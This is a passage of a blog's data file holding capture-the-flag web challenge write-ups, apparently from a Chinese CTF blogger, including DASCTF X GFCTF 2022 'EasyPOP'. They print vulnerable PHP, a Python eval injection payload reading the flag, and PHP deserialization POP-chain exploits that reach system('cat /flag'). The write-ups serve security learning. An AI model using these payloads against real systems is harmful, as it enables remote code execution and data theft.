id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var nowScore = this.score += 1</span><br></pre></td></tr></table></figure>\n\n<p>js275</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var nowScore = this.score += 2077</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /_calculate?number1=5&amp;operator=*&amp;number2=6 HTTP/1.1</span><br></pre></td></tr></table></figure>\n\n<p>3</p>\n<p>number1,operatornumber2</p>\n<p>number2 RCE</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/_calculate?number1=5&amp;operator=*&amp;number2=__import__(&#x27;os&#x27;).popen(&#x27;cat /f*&#x27;).read()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">include &quot;flag.php&quot;;</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">$zeros=&quot;000000000000000000000000000000&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">foreach($_GET as $key =&gt; $value)&#123;</span><br><span class=\"line\">    $$key=$$value;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if ($flag==&quot;000000000000000000000000000000&quot;)&#123;</span><br><span class=\"line\">    echo &quot;&quot;;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    echo &quot;&quot;;</span><br><span class=\"line\">    var_dump($_GET);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p>?_GET&#x3D;flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var_dump($_GET);=&gt;  var_dump($flag);</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n<p>wpphp</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=0&amp;b=0&amp;c=0&amp;d=0&amp;e=999999999999999999&amp;submit=%E5%8D%B7%E4%BA%86%E5%B0%B1%E8%B7%91%EF%BC%81</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">include &quot;flag.php&quot;;</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">class Moon&#123;</span><br><span class=\"line\">    public $name=&quot;&quot;;</span><br><span class=\"line\">    public function __toString()&#123;</span><br><span class=\"line\">        return $this-&gt;name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    public function __wakeup()&#123;</span><br><span class=\"line\">        echo &quot;&quot;.$this-&gt;name.&quot;&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class Ion_Fan_Princess&#123;</span><br><span class=\"line\">    public $nickname=&quot;&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function call()&#123;</span><br><span class=\"line\">        global $flag;</span><br><span class=\"line\">        if ($this-&gt;nickname==&quot;&quot;)&#123;</span><br><span class=\"line\">            echo $flag;</span><br><span class=\"line\">        &#125;else&#123;</span><br><span class=\"line\">            echo &quot;&quot;.$this-&gt;nickname.&quot;\\n&quot;;</span><br><span class=\"line\">            echo &quot;?!\\n&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    public function __toString()&#123;</span><br><span class=\"line\">        $this-&gt;call();</span><br><span class=\"line\">        return &quot;\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t----&quot;.$this-&gt;nickname;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if (isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class=\"line\">    unserialize($_GET[&#x27;code&#x27;]);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    $a=new Ion_Fan_Princess();</span><br><span class=\"line\">    echo $a;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>Ion_Fan_Princess call echo $flag</p>\n<p>Ion_Fan_Princess__toStringcall</p>\n<p>Moon  __wakeup ____toString</p>\n<p>pop</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Moon::__wakeup =&gt; Ion_Fan_Princess::__toString =&gt; Ion_Fan_Princess::call</span><br></pre></td></tr></table></figure>\n\n\n\n<p>exp</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">class Moon&#123;</span><br><span class=\"line\">    public $name;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class Ion_Fan_Princess&#123;</span><br><span class=\"line\">    public $nickname=&quot;&quot;;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a=new Moon;</span><br><span class=\"line\">$b=new Ion_Fan_Princess;</span><br><span class=\"line\">$a-&gt;name=$b;</span><br><span class=\"line\"></span><br><span class=\"line\">echo serialize($a);</span><br><span class=\"line\">//  &lt;?php</span><br><span class=\"line\">class Moon&#123;</span><br><span class=\"line\">    public $name;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class Ion_Fan_Princess&#123;</span><br><span class=\"line\">    public $nickname=&quot;&quot;;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a=new Moon;</span><br><span class=\"line\">$b=new Ion_Fan_Princess;</span><br><span class=\"line\">$a-&gt;name=$b;</span><br><span class=\"line\"></span><br><span class=\"line\">echo serialize($a);</span><br><span class=\"line\">// O:4:&quot;Moon&quot;:1:&#123;s:4:&quot;name&quot;;O:16:&quot;Ion_Fan_Princess&quot;:1:&#123;s:8:&quot;nickname&quot;;s:9:&quot;&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?code=O:4:&quot;Moon&quot;:1:&#123;s:4:&quot;name&quot;;O:16:&quot;Ion_Fan_Princess&quot;:1:&#123;s:8:&quot;nickname&quot;;s:9:&quot;&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>"},{"title":"DASCTF X GFCTF 2022","date":"2022-11-02T14:17:22.000Z","excerpt":"DASCTF X GFCTF 2022","_content":"\n\n\n# DASCTF X GFCTF 2022\n\n## \n\n## WEB\n\n\n\n### 1.EasyPOP\n\n\n\n```php\n <?php\nhighlight_file(__FILE__);\nerror_reporting(0);\n\nclass fine\n{\n    private $cmd;\n    private $content;\n\n    public function __construct($cmd, $content)\n    {\n        $this->cmd = $cmd;\n        $this->content = $content;\n    }\n\n    public function __invoke()\n    {\n        call_user_func($this->cmd, $this->content);\n    }\n\n    public function __wakeup()\n    {\n        $this->cmd = \"\";\n        die(\"Go listen to Jay Chou's secret-code! Really nice\");\n    }\n}\n\nclass show\n{\n    public $ctf;\n    public $time = \"Two and a half years\";\n\n    public function __construct($ctf)\n    {\n        $this->ctf = $ctf;\n    }\n\n\n    public function __toString()\n    {\n        return $this->ctf->show();\n    }\n\n    public function show(): string\n    {\n        return $this->ctf . \": Duration of practice: \" . $this->time;\n    }\n\n\n}\n\nclass sorry\n{\n    private $name;\n    private $password;\n    public $hint = \"hint is depend on you\";\n    public $key;\n\n    public function __construct($name, $password)\n    {\n        $this->name = $name;\n        $this->password = $password;\n    }\n\n    public function __sleep()\n    {\n        $this->hint = new secret_code();\n    }\n\n    public function __get($name)\n    {\n        $name = $this->key;\n        $name();\n    }\n\n\n    public function __destruct()\n    {\n        if ($this->password == $this->name) {\n\n            echo $this->hint;\n        } else if ($this->name = \"jay\") {\n            secret_code::secret();\n        } else {\n            echo \"This is our code\";\n        }\n    }\n\n\n    public function getPassword()\n    {\n        return $this->password;\n    }\n\n    public function setPassword($password): void\n    {\n        $this->password = $password;\n    }\n\n\n}\n\nclass secret_code\n{\n    protected $code;\n\n    public static function secret()\n    {\n        include_once \"hint.php\";\n        hint();\n    }\n\n    public function __call($name, $arguments)\n    {\n        $num = $name;\n        $this->$num();\n    }\n\n    private function show()\n    {\n        return $this->code->secret;\n    }\n}\n\n\nif (isset($_GET['pop'])) {\n    $a = unserialize($_GET['pop']);\n    $a->setPassword(md5(mt_rand()));\n} else {\n    $a = new show(\"Ctfer\");\n    echo $a->show();\n}\nCtfer: Duration of practice: Two and a half years\n```\n\n`fine::invoke`\n\n`$a = unserialize($_GET['pop']);`******pop**\n\n\n\n```\nfine::__invoke() <- sorry::__get() <- secret_code::show() <- secret_code::__call() <- show::__toString() <- sorry::__destruct() \n\n```\n\n\n\n\n\n**poc**\n\n```\n<?php\nclass fine\n{\n    public $cmd;\n    public $content;\n}\nclass secret_code\n{\n    public $code;\n}\n\nclass show\n{\n    public $ctf;\n    public $time;\n}\n\n\nclass sorry\n{\n    public $name;\n    public $password;\n    public $hint;\n    public $key;\n}\n\n$sorry = new sorry();\n$sorry2 = new sorry();\n$show = new show();\n$secret_code = new secret_code();\n$fine = new fine();\n$sorry->hint = $show;\n$show->ctf = $secret_code;\n$secret_code->code = $sorry2;\n$sorry2->key = $fine;\n$fine->cmd = 'system';\n$fine->content = 'cat /flag';\necho serialize($sorry);\n?>\n//wakeup\n//?pop=O:5:\"sorry\":4:{s:4:\"name\";N;s:8:\"password\";N;s:4:\"hint\";O:4:\"show\":2:{s:3:\"ctf\";O:11:\"secret_code\":1:{s:4:\"code\";O:5:\"sorry\":4:{s:4:\"name\";N;s:8:\"password\";N;s:4:\"hint\";N;s:3:\"key\";O:4:\"fine\":3:{s:3:\"cmd\";s:6:\"system\";s:7:\"content\";s:9:\"cat /flag\";}}}s:4:\"time\";N;}s:3:\"key\";N;}\n\n```","source":"_posts/DASCTF X GFCTF 2022.md","raw":"---\ntitle: DASCTF X GFCTF 2022\ndate: 2022-11-02 22:17:22\nexcerpt: DASCTF X GFCTF 2022\ncategories: \n---\n\n\n\n# DASCTF X GFCTF 2022\n\n## \n\n## WEB\n\n\n\n### 1.EasyPOP\n\n\n\n```php\n <?php\nhighlight_file(__FILE__);\nerror_reporting(0);\n\nclass fine\n{\n    private $cmd;\n    private $content;\n\n    public function __construct($cmd, $content)\n    {\n        $this->cmd = $cmd;\n        $this->content = $content;\n    }\n\n    public function __invoke()\n    {\n        call_user_func($this->cmd, $this->content);\n    }\n\n    public function __wakeup()\n    {\n        $this->cmd = \"\";\n        die(\"Go listen to Jay Chou's secret-code! Really nice\");\n    }\n}\n\nclass show\n{\n    public $ctf;\n    public $time = \"Two and a half years\";\n\n    public function __construct($ctf)\n    {\n        $this->ctf = $ctf;\n    }\n\n\n    public function __toString()\n    {\n        return $this->ctf->show();\n    }\n\n    public function show(): string\n    {\n        return $this->ctf . \": Duration of practice: \" . $this->time;\n    }\n\n\n}\n\nclass sorry\n{\n    private $name;\n    private $password;\n    public $hint = \"hint is depend on you\";\n    public $key;\n\n    public function __construct($name, $password)\n    {\n        $this->name = $name;\n        $this->password = $password;\n    }\n\n    public function __sleep()\n    {\n        $this->hint = new secret_code();\n    }\n\n    public function __get($name)\n    {\n        $name = $this->key;\n        $name();\n    }\n\n\n    public function __destruct()\n    {\n        if ($this->password == $this->name) {\n\n            echo $this->hint;\n        } else if ($this->name = \"jay\") {\n            secret_code::secret();\n        } else {\n            echo \"This is our code\";\n        }\n    }\n\n\n    public function getPassword()\n    {\n        return $this->password;\n    }\n\n    public function setPassword($password): void\n    {\n        $this->password = $password;\n    }\n\n\n}\n\nclass secret_code\n{\n    protected $code;\n\n    public static function secret()\n    {\n        include_once \"hint.php\";\n        hint();\n    }\n\n    public function __call($name, $arguments)\n    {\n        $num = $name;\n        $this->$num();\n    }\n\n    private function show()\n    {\n        return $this->code->secret;\n    }\n}\n\n\nif (isset($_GET['pop'])) {\n    $a = unserialize($_GET['pop']);\n    $a->setPassword(md5(mt_rand()));\n} else {\n    $a = new show(\"Ctfer\");\n    echo $a->show();\n}\nCtfer: Duration of practice: Two and a half years\n```\n\n`fine::invoke`\n\n`$a = unserialize($_GET['pop']);`******pop**\n\n\n\n```\nfine::__invoke() <- sorry::__get() <- secret_code::show() <- secret_code::__call() <- show::__toString() <- sorry::__destruct() \n\n```\n\n\n\n\n\n**poc**\n\n```\n<?php\nclass fine\n{\n    public $cmd;\n    public $content;\n}\nclass secret_code\n{\n    public $code;\n}\n\nclass show\n{\n    public $ctf;\n    public $time;\n}\n\n\nclass sorry\n{\n    public $name;\n    public $password;\n    public $hint;\n    public $key;\n}\n\n$sorry = new sorry();\n$sorry2 = new sorry();\n$show = new show();\n$secret_code = new secret_code();\n$fine = new fine();\n$sorry->hint = $show;\n$show->ctf = $secret_code;\n$secret_code->code = $sorry2;\n$sorry2->key = $fine;\n$fine->cmd = 'system';\n$fine->content = 'cat /flag';\necho serialize($sorry);\n?>\n//wakeup\n//?pop=O:5:\"sorry\":4:{s:4:\"name\";N;s:8:\"password\";N;s:4:\"hint\";O:4:\"show\":2:{s:3:\"ctf\";O:11:\"secret_code\":1:{s:4:\"code\";O:5:\"sorry\":4:{s:4:\"name\";N;s:8:\"password\";N;s:4:\"hint\";N;s:3:\"key\";O:4:\"fine\":3:{s:3:\"cmd\";s:6:\"system\";s:7:\"content\";s:9:\"cat /flag\";}}}s:4:\"time\";N;}s:3:\"key\";N;}\n\n```","slug":"DASCTF X GFCTF 2022","published":1,"updated":"2024-04-17T08:42:59.686Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clv3kf7hs0001h7768cbd86nu","content":"<h1 id=\"DASCTF-X-GFCTF-2022\"><a href=\"#DASCTF-X-GFCTF-2022\" class=\"headerlink\" title=\"DASCTF X GFCTF 2022\"></a>DASCTF X GFCTF 2022</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h2 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h2><h3 id=\"1-EasyPOP\"><a href=\"#1-EasyPOP\" class=\"headerlink\" title=\"1.EasyPOP\"></a>1.EasyPOP</h3><p></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">fine</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$cmd</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$content</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$cmd</span>, <span class=\"variable\">$content</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;cmd = <span class=\"variable\">$cmd</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;content = <span class=\"variable\">$content</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">call_user_func</span>(<span class=\"variable\">$this</span>-&gt;cmd, <span class=\"variable\">$this</span>-&gt;content);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;cmd = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Go listen to Jay Chou&#x27;s secret-code! Really nice&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">show</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$ctf</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$time</span> = <span class=\"string\">&quot;Two and a half years&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$ctf</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;ctf = <span class=\"variable\">$ctf</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;ctf-&gt;<span class=\"title function_ invoke__\">show</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">show</span>(<span class=\"params\"></span>): <span class=\"title\">string</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;ctf . <span class=\"string\">&quot;: Duration of practice: &quot;</span> . <span class=\"variable language_\">$this</span>-&gt;time;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">sorry</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$hint</span> = <span class=\"string\">&quot;hint is depend on you&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$key</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$name</span>, <span class=\"variable\">$password</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name = <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__sleep</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;hint = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">secret_code</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span>(<span class=\"params\"><span class=\"variable\">$name</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$name</span> = <span class=\"variable language_\">$this</span>-&gt;key;</span><br><span class=\"line\">        <span class=\"variable\">$name</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;password == <span class=\"variable language_\">$this</span>-&gt;name) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>-&gt;hint;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;name = <span class=\"string\">&quot;jay&quot;</span>) &#123;</span><br><span class=\"line\">            secret_code::<span class=\"title function_ invoke__\">secret</span>();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;This is our code&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getPassword</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;password;</span><br><span 